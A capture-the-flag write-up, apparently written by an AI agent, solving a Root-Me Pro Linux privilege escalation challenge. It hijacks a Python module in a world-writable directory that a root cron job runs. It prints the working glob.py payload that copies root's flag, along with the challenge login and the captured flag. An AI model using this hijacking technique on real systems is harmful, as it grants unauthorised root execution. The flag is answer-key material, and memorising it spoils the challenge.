# Linux Privesc - Module Hijacking

Root-Me Pro, System/Privesc, Medium, 300pts, ~30min
https://root-me.pro/ctf/resources/0197ef7d-dd11-736b-867e-6948600d45db (Privilege Escalation)
https://root-me.pro/ctf/resources/01995d1d-abd0-7369-aaac-e304f1555290 (Bash)

## Connection
ssh -p 32727 user@sockets.challenges.root-me.pro (password: password)
Directly reachable without VPN (DNS resolved + TCP connect worked pre-VPN).
Note: `sudo` on the local Kali VM was NOT actually passwordless despite CLAUDE.md — asked
user to bring up rootme VPN manually; turned out unnecessary anyway.

## Enumeration
- `id` -> uid=1000(user), no sudo rights of note
- `/opt/backup_tool/` — drwxrwxrwx (world-writable!) owned by root, contains `tcp_monitor.py`
- `tcp_monitor.py` imports stdlib only: os, time, socket, subprocess, datetime, glob, sys
  - runs `ss -tlnp`, writes report to /root/reports, rotates old reports via `glob.glob(...)`
- `/etc/cron.d/tcp_monitor`:
  `* * * * * root cd /opt/backup_tool && python3 tcp_monitor.py > /dev/null 2>&1`
  -> root runs the script every minute with cwd = /opt/backup_tool

## Vulnerability
Classic Python module hijacking / sys.path[0] abuse:
- When `python3 tcp_monitor.py` is invoked from within `/opt/backup_tool`, that directory is
  first on `sys.path`.
- Directory is world-writable, so any user can drop a file named after a stdlib module the
  script imports (e.g. `glob.py`) and it will be imported INSTEAD of the real stdlib module.
- Payload code executes as root at import time (top of script), before `main()` even runs.

## Exploit
Dropped `/opt/backup_tool/glob.py`:
```python
import os
os.system("cp /root/flag.txt /tmp/.flag_out 2>/dev/null; chmod 644 /tmp/.flag_out 2>/dev/null")

def glob(*args, **kwargs):
    return []
```
Uploaded via scp, waited for next cron minute tick, then `cat /tmp/.flag_out`.

## Flag
RM{09d0d7286603a0d032465d2479c8edb0}

## Cleanup note
Left `/opt/backup_tool/glob.py` and `/tmp/.flag_out` on the box (ephemeral challenge instance,
gets torn down). Not cleaned up further.
